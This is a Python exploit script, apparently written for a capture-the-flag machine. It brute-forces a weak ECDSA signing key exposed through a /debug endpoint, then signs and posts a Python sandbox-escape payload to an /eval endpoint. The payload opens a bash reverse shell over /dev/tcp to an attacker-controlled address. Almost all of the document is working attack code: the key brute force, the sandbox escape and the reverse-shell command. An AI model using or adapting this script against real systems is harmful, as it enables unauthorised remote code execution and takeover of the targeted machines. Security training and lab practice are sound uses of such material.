#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

import requests
import logging
import sys
import binascii
from ecdsa import SigningKey, NIST384p

BASEHOST = "http://127.0.0.1:8181"
ATTACKER_HOST = "10.10.16.80"
ATTACKER_PORT = "15500"

PAYLOAD_TEMPL = """
(lambda __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__):
    __builtins__['print'](__builtins__['__import__']('os').system("bash -c 'bash -i &>/dev/tcp/{attip}/{attport} 0<&1'"))
)()
""".format(attip=ATTACKER_HOST, attport=ATTACKER_PORT)

logger = logging.getLogger("default_log")
handler = logging.StreamHandler()
formatter = logging.Formatter("%(levelname)s | %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)


def check_server():
    queryurl = BASEHOST
    logger.critical("Trying to check server status...")
    r = requests.get(queryurl)
    logger.info(r.json())


def get_dbg_info():
    queryurl = BASEHOST + "/debug"
    logger.critical("Getting Debug Info...")
    r = requests.get(queryurl)
    logger.debug(r.json())
    return r.json()


def send_exploit(rand):
    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
    vk = sk.get_verifying_key()

    def sign(msg):
        return binascii.hexlify(sk.sign(msg))

    queryurl = BASEHOST + "/eval"
    finalexploit = PAYLOAD_TEMPL
    logger.critical("Sending exploit...")
    payload = {
        "expr": finalexploit,
        "sig": sign(finalexploit.encode()).decode()
    }
    r = requests.post(queryurl, json=payload)
    try:
        logger.info(r.json())
        logger.info("Seems Work. Check your netcat and maintain the privileges.")
    except:
        logger.error("Error: Payload Error!")
        logger.error(r.text)


def printusage():
    print("------------------------------------------------------------------------------")
    print("Usage: Directly Modify the Script and Run it")
    print("PLEASE NOTE: THE SHELL HERE IS UNSTABLE, DO NOT USE IT FOR A LONG TIME PERIOD!")
    print("------------------------------------------------------------------------------")


def try_bf(orijson):
    def verify(vk, msg, sig):
        try:
            return vk.verify(binascii.unhexlify(sig), msg)
        except:
            return False

    logger.info("You have about 25% rate to get a correct rand.")
    oridt = orijson['response']['Expression'].encode()
    orisig = orijson['response']['Signature'].encode()
    FLAG = 0
    for i in range(1, 501):
        logger.info("Current Working on: RAND=" + str(i))
        rand = i
        sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
        vk = sk.get_verifying_key()
        success_not = verify(vk, oridt, orisig)
        if success_not:
            FLAG = 1
            logger.critical("Rand is: " + str(rand))
            return rand
    if FLAG == 0:
        print("You may reset the machine, rand is large than 500.")
        sys.exit(0)


def main():
    printusage()
    check_server()
    orid = get_dbg_info()
    randv = try_bf(orid)
    send_exploit(randv)


if __name__ == '__main__':
    main()
